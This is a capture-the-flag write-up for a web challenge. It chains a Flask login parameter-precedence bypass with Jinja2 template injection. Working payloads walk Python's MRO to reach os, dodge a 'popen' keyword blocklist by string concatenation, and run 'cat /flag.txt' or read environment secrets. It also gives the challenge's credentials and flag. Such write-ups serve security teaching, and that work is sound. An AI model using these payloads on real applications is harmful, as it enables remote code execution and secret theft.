# OutOfContext — Official Writeup

**Challenge Category:** Web Exploitation  
**Vulnerabilities:** 
1. Authentication-State Confusion (Parameter Precedence)
2. Server-Side Template Injection (SSTI)
3. Python MRO Object Traversal & Keyword Filter Evasion  
**Objective:** Bypass authentication restrictions to gain an `editor` session, exploit template injection to achieve Remote Code Execution (RCE), and retrieve `/flag.txt`.

---

## Overview
The "OutOfContext" challenge presents an enterprise document template management portal. The portal allows authorized document specialists to author and preview templates using a custom Jinja2 rendering engine. 

The attack chain consists of two main stages:
1. **Authentication-State Confusion**: Exploiting a discrepancy between `request.form` credential verification and `request.values` session binding to escalate from an unprivileged compliance account to the `editor` account.
2. **Template Sandbox Escape & RCE**: Injecting Jinja2 expressions into the "Live Preview" feature, traversing Python's Method Resolution Order (MRO) to access `sys.modules['os']`, bypassing the `"popen"` keyword filter via string concatenation, and reading `/flag.txt`.

---

## Step 1: Reconnaissance
Navigating to the challenge login page (`/login`) shows a standard authentication card. Inspecting the HTML page source (`Ctrl+U` / View Page Source) reveals an internal developer comment left during staging:

```html
<!-- [DEV/QA NOTICE - 2026-Q3 AUDIT]: Temporary auditor sandbox credentials for internal review: compliance_officer / AuditPolicy2026! -->
```

- **Username:** `compliance_officer`
- **Password:** `AuditPolicy2026!`

Logging in as `compliance_officer` establishes an auditor session. However, attempting to create or edit templates returns `Access Denied: Template authoring and live preview execution require Document Specialist privileges.` Document authoring requires an **`editor`** (`Document Specialist`) session.

---

## Step 2: Exploit Authentication-State Confusion
Inspecting how the Flask backend handles logins reveals an identity resolution discrepancy:
- The backend verifies credentials using `request.form` (the HTTP POST body).
- However, the user identity bound to the Flask-Login session is extracted using `request.values.get("username")`.

In Werkzeug / Flask, `request.values` is a `CombinedMultiDict` containing both URL query parameters (`request.args`) and POST body data (`request.form`), with **URL query parameters taking precedence**.

By submitting a login request that provides valid `compliance_officer` credentials in the form body while specifying `username=editor` in the URL query string:

```http
POST /login?username=editor HTTP/1.1
Host: <TARGET_HOST>
Content-Type: application/x-www-form-urlencoded

username=compliance_officer&password=AuditPolicy2026!
```

### Execution Flow:
1. `request.form.get("username")` (`compliance_officer`) and `request.form.get("password")` are checked against the database -> **Credentials Valid**.
2. `request.values.get("username")` evaluates to `"editor"` (from the query string).
3. The server resolves the `editor` user (role: `Document Specialist`) and establishes the authenticated Flask-Login session cookie for `editor`.

---

## Step 3: Identify Server-Side Template Injection (SSTI)
With an active `editor` session, navigate to the **Templates** section and open the editor (`/templates/new` or `/templates/1/edit`).

In the template content area, inject a basic Jinja2 expression:

```jinja2
{{ 7 * 7 }}
```

Click **Live Preview**. The output rendered is:

```text
49
```

This confirms server-side template evaluation.

---

## Step 4: Enumerate Template Context & Object Hierarchy
To escape the template sandbox and achieve arbitrary code execution, we inspect the available `helper` object passed to the renderer context:

```jinja2
{{ helper.__class__.__name__ }}
```
*Output:* `TemplateContextHelper`

From `helper`, traverse up to the root `object` class via its Method Resolution Order (`__mro__`):

```jinja2
{{ helper.__class__.__mro__[1].__name__ }}
```
*Output:* `object`

Next, list all loaded subclasses of `object` to find useful utility classes:

```jinja2
{% for c in helper.__class__.__mro__[1].__subclasses__() %}
{{ c.__name__ }}
{% endfor %}
```

Among the subclasses, we locate `catch_warnings`.

---

## Step 5: Reach Python Globals and the `os` Module
The `catch_warnings` class exposes its initializer's global namespace via `__init__.__globals__`. From this dictionary, we can access the `sys` module and inspect loaded modules:

```jinja2
c.__init__.__globals__['sys'].modules['os']
```

---

## Step 6: Bypass the Keyword Blocklist
The backend employs a security filter that rejects templates containing dangerous strings such as `"popen"`, `"os."`, or `"__import__"`.

To bypass the blocklist, we dynamically construct the `'popen'` attribute name inside the template using Jinja2's string concatenation operator (`~`):

```jinja2
'po' ~ 'pen'
```

Accessing the function dynamically via the module's `__dict__` avoids referencing `os.popen` directly:

```jinja2
c.__init__.__globals__['sys'].modules['os'].__dict__['po' ~ 'pen']
```

---

## Step 7: Retrieve the Flag

Solvers can retrieve the flag using either of two valid extraction vectors:

### Method A: Environment Variable Inspection (Recommended / In-Memory)
Access the container environment variables directly via `os.environ`:

```jinja2
{% for c in helper.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {{ c.__init__.__globals__['sys'].modules['os'].environ['FLAG'] }}
  {% endif %}
{% endfor %}
```

### Method B: Subprocess Execution & File Read (`/flag.txt`)
Access `os.popen` dynamically using string concatenation (`'po' ~ 'pen'`) to read the root filesystem flag file:

```jinja2
{% for c in helper.__class__.__mro__[1].__subclasses__() %}
  {% if c.__name__ == 'catch_warnings' %}
    {{ c.__init__.__globals__['sys'].modules['os'].__dict__['po' ~ 'pen']('cat /flag.txt').read() }}
  {% endif %}
{% endfor %}
```

Submit either payload in the template editor and click **Live Preview**. The application returns the flag:

```text
NullOrigin{T3r4_Bh41_S33dh3_m4u7}
```

---
**Challenge Completed!**
